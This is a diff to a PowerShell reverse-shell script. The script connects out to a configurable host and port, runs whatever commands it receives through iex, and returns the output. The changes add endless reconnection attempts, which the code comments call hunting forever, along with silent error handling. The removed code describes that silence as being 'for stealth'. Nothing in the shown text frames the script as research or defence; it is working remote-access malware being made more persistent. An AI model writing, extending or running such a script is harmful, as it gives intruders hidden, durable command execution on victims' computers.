@@ -1,7 +1,9 @@
 param(
     [string]$Host = "127.0.0.1",
     [int]$Port = 4444,
-    [int]$TimeoutMs = 5000
+    [int]$TimeoutMs = 5000,
+    [int]$ReconnectDelay = 10,
+    [int]$MaxRetries = 0  # 0 = hunt forever
 )
 
 function Connect-TCPClient {
@@ -13,23 +15,19 @@ function Connect-TCPClient {
 
     if (-not $waited) {
         $client.Close()
-        throw "Connection timed out to ${Host}:${Port}"
+        throw "timeout"
     }
 
     $client.EndConnect($connect)
     return $client
 }
 
-try {
-    $client = Connect-TCPClient -Host $Host -Port $Port -TimeoutMs $TimeoutMs
-    $stream = $client.GetStream()
-    $reader = New-Object System.IO.StreamReader($stream)
-    $writer = New-Object System.IO.StreamWriter($stream)
-    $writer.AutoFlush = $true
+function Invoke-Shell {
+    param($Reader, $Writer, $Client)
 
-    while ($client.Connected) {
-        $cmd = $reader.ReadLine()
-        if ($null -eq $cmd -or $cmd -eq "exit") { break }
+    while ($Client.Connected) {
+        $cmd = $Reader.ReadLine()
+        if ($null -eq $cmd -or $cmd -eq "exit") { return $false }
 
         try {
             $output = iex $cmd 2>&1 | Out-String
@@ -38,14 +36,34 @@ try {
             $output = "ERROR: $_"
         }
 
-        $writer.WriteLine($output.TrimEnd())
+        $Writer.WriteLine($output.TrimEnd())
     }
+
+    return $true  # reconnect
 }
-catch {
-    # silent — no console output for stealth
-}
-finally {
-    if ($writer) { $writer.Close() }
-    if ($reader) { $reader.Close() }
-    if ($client) { $client.Close() }
+
+$attempt = 0
+
+while ($MaxRetries -eq 0 -or $attempt -lt $MaxRetries) {
+    $attempt++
+    try {
+        $client = Connect-TCPClient -Host $Host -Port $Port -TimeoutMs $TimeoutMs
+        $stream  = $client.GetStream()
+        $reader  = New-Object System.IO.StreamReader($stream)
+        $writer  = New-Object System.IO.StreamWriter($stream)
+        $writer.AutoFlush = $true
+
+        $attempt = 0  # reset on successful connection
+
+        $reconnect = Invoke-Shell -Reader $reader -Writer $writer -Client $client
+        if (-not $reconnect) { break }
+    }
+    catch { }
+    finally {
+        if ($writer) { try { $writer.Close() } catch {} }
+        if ($reader) { try { $reader.Close() } catch {} }
+        if ($client) { try { $client.Close() } catch {} }
+    }
+
+    Start-Sleep -Seconds $ReconnectDelay
 }
